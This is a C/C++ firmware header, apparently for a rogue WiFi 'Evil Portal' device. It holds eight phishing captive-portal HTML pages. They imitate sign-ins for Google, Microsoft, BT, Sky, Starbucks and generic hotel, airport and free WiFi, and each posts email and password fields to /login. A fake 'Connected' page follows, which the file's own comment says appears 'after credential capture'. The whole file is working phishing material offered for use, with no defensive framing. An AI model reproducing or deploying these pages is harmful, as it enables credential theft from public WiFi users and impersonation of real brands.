#pragma once
// Evil Portal HTML Templates
// Each template mimics a well-known login page

// Template 0 - Generic Free WiFi
static const char EP_T0[] PROGMEM = R"html(<!DOCTYPE html><html><head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Free WiFi Login</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{background:#f0f2f5;font-family:-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}.box{background:#fff;border-radius:12px;padding:32px 28px;width:100%;max-width:360px;box-shadow:0 4px 24px rgba(0,0,0,.12);text-align:center}.logo{font-size:2.5rem;margin-bottom:8px}.title{font-weight:700;font-size:1.1rem;color:#0078d4;margin-bottom:4px}.sub{color:#999;font-size:.8rem;margin-bottom:20px}label{display:block;text-align:left;font-size:.82rem;color:#666;margin-bottom:4px}input{width:100%;border:1px solid #ddd;border-radius:8px;padding:11px 14px;font-size:.9rem;margin-bottom:14px}button{width:100%;background:#0078d4;color:#fff;border:none;border-radius:8px;padding:12px;font-size:.95rem;cursor:pointer}.note{color:#aaa;font-size:.72rem;margin-top:14px}</style></head>
<body><div class='box'><div class='logo'>&#128246;</div><div class='title'>Free WiFi</div><div class='sub'>Sign in to continue</div>
<form method='POST' action='/login'><label>Email</label><input type='text' name='user' autocomplete='off'/><label>Password</label><input type='password' name='pass'/><button>Connect</button></form>
<div class='note'>By connecting you agree to our Terms.</div></div></body></html>)html";

// Template 1 - BT/EE Broadband
static const char EP_T1[] PROGMEM = R"html(<!DOCTYPE html><html><head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>BT WiFi</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{background:#f5f5f5;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}.box{background:#fff;border-radius:4px;padding:40px 32px;width:100%;max-width:380px;box-shadow:0 2px 8px rgba(0,0,0,.1)}.logo{color:#5514b4;font-size:2rem;font-weight:900;margin-bottom:20px}.title{font-size:1.2rem;color:#333;margin-bottom:8px}.sub{color:#666;font-size:.85rem;margin-bottom:24px}input{width:100%;border:1px solid #ccc;border-radius:4px;padding:12px;font-size:.9rem;margin-bottom:16px;display:block}button{width:100%;background:#5514b4;color:#fff;border:none;border-radius:4px;padding:14px;font-size:1rem;cursor:pointer}</style></head>
<body><div class='box'><div class='logo'>BT</div><div class='title'>Sign in to BT WiFi</div><div class='sub'>Enter your BT ID to access the internet</div>
<form method='POST' action='/login'><input type='email' name='user' placeholder='BT Email Address' autocomplete='off'/><input type='password' name='pass' placeholder='Password'/><button>Sign In</button></form></div></body></html>)html";

// Template 2 - Sky WiFi
static const char EP_T2[] PROGMEM = R"html(<!DOCTYPE html><html><head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Sky WiFi</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{background:#00457c;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}.box{background:#fff;border-radius:8px;padding:40px 32px;width:100%;max-width:380px}.logo{color:#00457c;font-size:2.5rem;font-weight:900;margin-bottom:4px}.tagline{color:#009bde;font-size:.8rem;margin-bottom:24px}.title{font-size:1.1rem;color:#333;margin-bottom:20px}input{width:100%;border:2px solid #ddd;border-radius:4px;padding:12px;font-size:.9rem;margin-bottom:14px;display:block}input:focus{border-color:#009bde;outline:none}button{width:100%;background:#009bde;color:#fff;border:none;border-radius:4px;padding:14px;font-size:1rem;cursor:pointer}</style></head>
<body><div class='box'><div class='logo'>sky</div><div class='tagline'>believe in better</div><div class='title'>Sign in to Sky WiFi</div>
<form method='POST' action='/login'><input type='email' name='user' placeholder='Sky iD email' autocomplete='off'/><input type='password' name='pass' placeholder='Password'/><button>Sign In</button></form></div></body></html>)html";

// Template 3 - Google Account
static const char EP_T3[] PROGMEM = R"html(<!DOCTYPE html><html><head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Sign in - Google Accounts</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{background:#fff;font-family:Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}.box{width:100%;max-width:400px;padding:48px 40px;border:1px solid #dadce0;border-radius:8px}.glogo{font-size:1.8rem;color:#4285f4;font-weight:700;margin-bottom:24px}.glogo span{color:#ea4335}G<span>o</span><span style='color:#fbbc04'>o</span><span style='color:#4285f4'>g</span><span style='color:#34a853'>l</span><span style='color:#ea4335'>e</span>.title{font-size:1.5rem;color:#202124;margin-bottom:8px;text-align:center}.sub{color:#5f6368;font-size:.875rem;margin-bottom:32px;text-align:center}input{width:100%;border:1px solid #dadce0;border-radius:4px;padding:13px 15px;font-size:1rem;margin-bottom:20px;display:block}input:focus{border-color:#1a73e8;outline:none}button{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:.875rem;cursor:pointer;float:right}</style></head>
<body><div class='box'><div style='text-align:center;font-size:1.5rem;font-weight:700;margin-bottom:16px'><span style='color:#4285f4'>G</span><span style='color:#ea4335'>o</span><span style='color:#fbbc04'>o</span><span style='color:#4285f4'>g</span><span style='color:#34a853'>l</span><span style='color:#ea4335'>e</span></div>
<div class='title'>Sign in</div><div class='sub'>Use your Google Account</div>
<form method='POST' action='/login'><input type='email' name='user' placeholder='Email or phone' autocomplete='off'/><input type='password' name='pass' placeholder='Enter your password'/><button type='submit'>Next</button></form></div></body></html>)html";

// Template 4 - Microsoft
static const char EP_T4[] PROGMEM = R"html(<!DOCTYPE html><html><head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Sign in to your Microsoft account</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{background:#f2f2f2;font-family:'Segoe UI',sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}.box{background:#fff;padding:44px 44px 32px;width:100%;max-width:440px}.logo{color:#737373;font-size:1.5rem;font-weight:300;margin-bottom:24px}.title{font-size:1.5rem;color:#1b1b1b;margin-bottom:4px}.sub{color:#737373;font-size:.875rem;margin-bottom:24px}input{width:100%;border:none;border-bottom:1px solid #666;padding:8px 0;font-size:1rem;margin-bottom:24px;display:block;outline:none}input:focus{border-bottom-color:#0067b8}button{background:#0067b8;color:#fff;border:none;padding:8px 20px;font-size:.875rem;cursor:pointer;float:right}</style></head>
<body><div class='box'><div class='logo'>Microsoft</div><div class='title'>Sign in</div><div class='sub'>No account? Create one!</div>
<form method='POST' action='/login'><input type='email' name='user' placeholder='Email, phone, or Skype' autocomplete='off'/><input type='password' name='pass' placeholder='Password'/><button>Sign in</button></form></div></body></html>)html";

// Template 5 - Starbucks WiFi
static const char EP_T5[] PROGMEM = R"html(<!DOCTYPE html><html><head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Starbucks WiFi</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{background:#1e3932;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}.box{background:#fff;border-radius:4px;padding:40px 32px;width:100%;max-width:380px;text-align:center}.logo{font-size:3rem;margin-bottom:8px}.title{color:#1e3932;font-size:1.3rem;font-weight:700;margin-bottom:4px}.sub{color:#666;font-size:.82rem;margin-bottom:24px}input{width:100%;border:1px solid #ccc;border-radius:4px;padding:12px;font-size:.9rem;margin-bottom:14px;display:block}button{width:100%;background:#00a862;color:#fff;border:none;border-radius:4px;padding:14px;font-size:1rem;cursor:pointer}</style></head>
<body><div class='box'><div class='logo'>&#9749;</div><div class='title'>Starbucks WiFi</div><div class='sub'>Sign in to enjoy free WiFi</div>
<form method='POST' action='/login'><input type='email' name='user' placeholder='Starbucks Rewards email' autocomplete='off'/><input type='password' name='pass' placeholder='Password'/><button>Connect</button></form></div></body></html>)html";

// Template 6 - Hotel WiFi
static const char EP_T6[] PROGMEM = R"html(<!DOCTYPE html><html><head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Hotel Guest WiFi</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{background:#1a1a2e;font-family:Georgia,serif;display:flex;align-items:center;justify-content:center;min-height:100vh}.box{background:#fff;padding:48px 40px;width:100%;max-width:400px;text-align:center}.logo{font-size:2rem;color:#c9a84c;margin-bottom:4px;letter-spacing:4px}.stars{color:#c9a84c;font-size:1rem;margin-bottom:20px}.title{font-size:1.1rem;color:#333;margin-bottom:20px}input{width:100%;border:1px solid #ddd;padding:12px;font-size:.9rem;margin-bottom:14px;display:block}button{width:100%;background:#c9a84c;color:#fff;border:none;padding:14px;font-size:1rem;cursor:pointer}</style></head>
<body><div class='box'><div class='logo'>GRAND</div><div class='stars'>&#9733;&#9733;&#9733;&#9733;&#9733;</div><div class='title'>Welcome Guest -- Please Sign In</div>
<form method='POST' action='/login'><input type='text' name='user' placeholder='Room Number or Email' autocomplete='off'/><input type='password' name='pass' placeholder='WiFi Access Code'/><button>Access Internet</button></form></div></body></html>)html";

// Template 7 - Airport WiFi
static const char EP_T7[] PROGMEM = R"html(<!DOCTYPE html><html><head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Airport Free WiFi</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{background:#003580;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}.box{background:#fff;border-radius:6px;padding:40px 32px;width:100%;max-width:400px}.header{display:flex;align-items:center;gap:12px;margin-bottom:24px}.logo{font-size:2rem}.brand{color:#003580;font-size:1.2rem;font-weight:700}.title{font-size:1rem;color:#333;margin-bottom:6px}.sub{color:#666;font-size:.82rem;margin-bottom:20px}input{width:100%;border:1px solid #ccc;border-radius:4px;padding:11px;font-size:.9rem;margin-bottom:12px;display:block}button{width:100%;background:#003580;color:#fff;border:none;border-radius:4px;padding:13px;font-size:.95rem;cursor:pointer}.terms{color:#999;font-size:.7rem;margin-top:12px;text-align:center}</style></head>
<body><div class='box'><div class='header'><div class='logo'>&#9992;</div><div><div class='brand'>Airport Free WiFi</div><div style='color:#666;font-size:.78rem'>Terminal Passenger Service</div></div></div>
<div class='title'>Complimentary WiFi Access</div><div class='sub'>Register to get 2 hours of free internet</div>
<form method='POST' action='/login'><input type='email' name='user' placeholder='Email address' autocomplete='off'/><input type='password' name='pass' placeholder='Create access password'/><button>Get Free WiFi</button></form>
<div class='terms'>By connecting you agree to acceptable use policy</div></div></body></html>)html";

// Array for easy access
static const char* EP_TEMPLATES[] = {EP_T0,EP_T1,EP_T2,EP_T3,EP_T4,EP_T5,EP_T6,EP_T7};
static const int EP_TEMPLATE_COUNT = 8;

// Success page shown after credential capture
static const char EP_OK[] PROGMEM = R"html(<!DOCTYPE html><html><head>
<meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Connected</title>
<style>body{background:#1a1a2e;display:flex;align-items:center;justify-content:center;
min-height:100vh;margin:0;font-family:Arial,sans-serif}
.box{background:#fff;border-radius:8px;padding:40px 32px;text-align:center;max-width:360px}
.icon{font-size:3rem;margin-bottom:12px}.title{font-size:1.2rem;font-weight:700;color:#333}
.sub{color:#666;font-size:.85rem;margin-top:8px}</style></head>
<body><div class='box'><div class='icon'>&#10003;</div>
<div class='title'>Connected!</div>
<div class='sub'>You are now connected to the network.<br>Enjoy your browsing.</div>
</div></body></html>)html";
